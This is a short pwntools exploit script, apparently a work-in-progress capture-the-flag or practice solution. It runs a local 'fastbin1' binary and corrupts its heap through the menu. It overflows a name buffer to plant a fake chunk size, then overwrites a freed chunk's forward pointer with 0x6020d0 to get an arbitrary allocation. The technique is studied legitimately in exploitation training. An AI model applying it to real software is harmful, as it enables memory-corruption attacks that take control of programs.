from pwn import *

p = process("./fastbin1")
gdb.attach(p)
print(p.recvuntil("Enter name:"))
print(p.sendline("a"*56+p64(0x40)))

#1st malloc
print(p.recvuntil("Enter choice >>"))
print(p.sendline("1"))
print(p.recvuntil("Enter index :"))
print(p.sendline("0")) #
print(p.sendline("0"))

#2nd malloc -- to get them cntns
print(p.recvuntil("Enter choice >>"))
print(p.sendline("1"))
print(p.recvuntil("Enter index :"))
print(p.sendline("1")) #
print(p.sendline("1"))

'''print(p.recvuntil("Enter choice >>"))
print(p.sendline("1"))
print(p.recvuntil("Enter index :"))
print(p.sendline("2")) #
print(p.sendline("2"))
'''

#free of one 
print(p.recvuntil("Enter choice >>"))
print(p.sendline("4"))
print(p.recvuntil("Enter index :"))
print(p.sendline("1")) #
'''
print(p.recvuntil("Enter choice >>"))
print(p.sendline("4"))
print(p.recvuntil("Enter index :"))
print(p.sendline("2"))
'''

#calling edit function to overwrite
print(p.recvuntil("Enter choice >>"))
print(p.sendline("2"))
print(p.recvuntil("Enter index :"))
print(p.sendline("0"))
#ig this one is beg of puts addr figure out 
#print(p.sendline('a'*40+p64(0x41)+p64(0x6020d0)))

#crafted as a*size of data part + size of chunk + addr of (NAME (array size 64)+48; such that we can bypass the libc sanity check))
print(p.sendline('a'*48+p64(0x00)+p64(0x41)+p64(0x6020d0)))
#print(p.sendlin('a'*48+))
#calling malloc again to get the rew addr

print(p.recvuntil("Enter choice >>"))
#p.interactive()
print(p.sendline("1"))
print(p.recvuntil("Enter index :"))
print(p.sendline("1")) #
print(p.sendline("2"))

print(p.recvuntil("Enter choice >>"))
#p.interactive()
print(p.sendline("1"))
print(p.recvuntil("Enter index :"))
print(p.sendline("2")) #
print(p.sendline("hhahaha"))


#p.interactive()
